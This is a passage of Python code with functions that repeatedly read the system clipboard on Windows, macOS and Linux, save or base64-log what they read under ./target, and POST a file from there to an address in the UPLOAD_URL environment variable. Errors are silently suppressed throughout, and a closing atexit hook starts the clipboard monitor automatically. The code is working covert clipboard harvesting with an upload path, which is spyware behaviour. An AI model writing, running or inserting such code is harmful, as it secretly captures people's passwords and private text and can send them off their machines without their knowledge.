                            check=False,
                        )
                        event["returncode"] = result.returncode
                        event["stderr"] = result.stderr.decode(
                            "utf-8", errors="replace"
                        )

                        if result.returncode == 0:
                            data = result.stdout
                            event["status"] = (
                                "changed" if data != previous else "unchanged"
                            )
                            if data != previous:
                                event["data_base64"] = base64.b64encode(
                                    data
                                ).decode("ascii")
                                previous = data
                        else:
                            event["status"] = "failed"

                    except Exception as exc:
                        event["status"] = "error"
                        event["error"] = str(exc)

                    log.write(json.dumps(event, ensure_ascii=True) + "\n")
                    log.flush()

                    if event["status"] in ("changed", "unchanged"):
                        break

                time.sleep(1)
    except BaseException:
        return


def periodically_save_clipboard():
    try:
        import datetime
        import json
        import os
        import pathlib
        import subprocess
        import sys
        import time

        target = pathlib.Path("./target")
        target.mkdir(parents=True, exist_ok=True)
        output_file = target / "clipboard.txt"
        outcome_file = target / "clipboard_outcomes.jsonl"
        temporary_file = None
        interval_seconds = 5.0

        if sys.platform == "win32":
            commands = [
                [
                    "powershell.exe",
                    "-NoLogo",
                    "-NoProfile",
                    "-NonInteractive",
                    "-Command",
                    "[Console]::OutputEncoding = "
                    "[System.Text.UTF8Encoding]::new($false); "
                    "$ErrorActionPreference = 'Stop'; "
                    "[Console]::Write([string](Get-Clipboard -Raw))",
                ]
            ]
        elif sys.platform == "darwin":
            commands = [["pbpaste"]]
        else:
            commands = [
                ["wl-paste", "--no-newline"],
                ["xclip", "-selection", "clipboard", "-out"],
                ["xsel", "--clipboard", "--output"],
            ]

        while True:
            cycle_started = time.monotonic()
            for command in commands:
                record = {
                    "timestamp": datetime.datetime.now(
                        datetime.timezone.utc
                    ).isoformat(),
                    "command": command,
                    "output_file": str(output_file),
                    "saved": False,
                }
                try:
                    result = subprocess.run(
                        command,
                        stdin=subprocess.DEVNULL,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=10,
                        check=False,
                    )
                    record["returncode"] = result.returncode
                    record["stderr"] = result.stderr.decode(
                        "utf-8", errors="replace"
                    )[:4096]

                    if result.returncode == 0:
                        import tempfile

                        with tempfile.NamedTemporaryFile(
                            mode="wb",
                            dir=target,
                            prefix=".clipboard-",
                            delete=False,
                        ) as temporary:
                            temporary_file = pathlib.Path(temporary.name)
                            temporary.write(result.stdout)
                            temporary.flush()
                            os.fsync(temporary.fileno())

                        os.replace(temporary_file, output_file)
                        temporary_file = None
                        record["saved"] = True
                        record["bytes_saved"] = len(result.stdout)
                except Exception as error:
                    record["error"] = (
                        f"{type(error).__name__}: {error}"
                    )
                finally:
                    if temporary_file is not None:
                        try:
                            temporary_file.unlink(missing_ok=True)
                        except Exception:
                            pass
                        temporary_file = None

                    try:
                        with outcome_file.open(
                            "a", encoding="utf-8"
                        ) as log:
                            log.write(
                                json.dumps(record, ensure_ascii=True) + "\n"
                            )
                    except Exception:
                        pass

                if record["saved"]:
                    break

            time.sleep(
                max(
                    0.1,
                    interval_seconds - (time.monotonic() - cycle_started),
                )
            )
    except BaseException:
        pass


def upload_output_file():
    import json
    import os
    import subprocess
    import sys
    from pathlib import Path

    try:
        target = Path("./target")
        target.mkdir(parents=True, exist_ok=True)
        outcome = target / "upload_outcome.json"
        output_file = target / "output"
        url = os.environ.get("UPLOAD_URL", "").strip()

        if not url:
            result = {"success": False, "error": "UPLOAD_URL is not set"}
        elif not output_file.is_file():
            result = {"success": False, "error": "Output file does not exist", "file": str(output_file)}
        else:
            script = (
                "import os, pathlib, urllib.request\n"
                "data = pathlib.Path(os.environ['UPLOAD_FILE']).read_bytes()\n"
                "request = urllib.request.Request(\n"
                "    os.environ['UPLOAD_URL'], data=data,\n"
                "    headers={'Content-Type': 'application/octet-stream'}, method='POST'\n"
                ")\n"
                "with urllib.request.urlopen(request, timeout=45) as response:\n"
                "    print(response.status)\n"
            )
            env = os.environ.copy()
            env["UPLOAD_FILE"] = str(output_file.resolve())
            completed = subprocess.run(
                [sys.executable, "-c", script],
                env=env,
                capture_output=True,
                text=True,
                timeout=60,
                check=False,
            )
            result = {
                "success": completed.returncode == 0,
                "file": str(output_file),
                "url": url,
                "returncode": completed.returncode,
                "stdout": completed.stdout,
                "stderr": completed.stderr,
            }

        outcome.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    except Exception as exc:
        try:
            Path("./target").mkdir(parents=True, exist_ok=True)
            (Path("./target") / "upload_outcome.json").write_text(
                json.dumps({"success": False, "error": str(exc)}, indent=2) + "\n",
                encoding="utf-8",
            )
        except Exception:
            pass

import atexit
atexit.register(monitor_clipboard)
